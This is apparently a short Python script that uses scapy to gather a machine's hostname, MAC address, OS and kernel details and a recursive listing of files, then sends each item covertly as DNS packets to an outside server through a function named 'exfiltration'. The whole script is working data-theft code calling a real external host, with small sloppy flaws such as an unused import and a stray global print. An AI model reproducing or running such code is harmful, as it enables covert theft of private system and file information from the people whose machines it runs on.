#!/usr/bin/env python

# Libraries
from scapy.all import *
import platform
import os
import getmac
import socket
import urllib.request as urllib2
from json import load
try:
    from os import scandir
except ImportError:
    from scandir import scandir

# ==========================================================================================

# System informations
try:
    opesys = platform.uname()
except NameError:
    opesys = os.uname()

system = opesys[0]
user = opesys[1]
distrib = opesys[2]
# get public ip address
# Mac address
macaddr = getmac.get_mac_address()

# ===========================================================================================
# Functions

def exfiltration(data):
    # Data exfiltration
	send(IP(dst="vps778212.ovh.net") / UDP() / DNS(qd=DNSQR(
    qname="73a94e9217810f490cff289694d0e538", qtype="A"))/data)
	print(i)
 
def scantree(path):
    #"""Recursively yield DirEntry objects for given directory."""
    for entry in scandir(path):
        if entry.is_dir(follow_symlinks=False):
            yield from scantree(entry.path)
        else:
            yield entry

if __name__ == '__main__':
    import sys
    
    tree = ""
    for entry in scantree(sys.argv[1] if len(sys.argv) > 1 else '.'):
        tree += "  \n  " + str(entry.path)
    
    test = [user,macaddr,system,distrib,tree]
    scantree(".")
    
    for i in test:
	    exfiltration(i)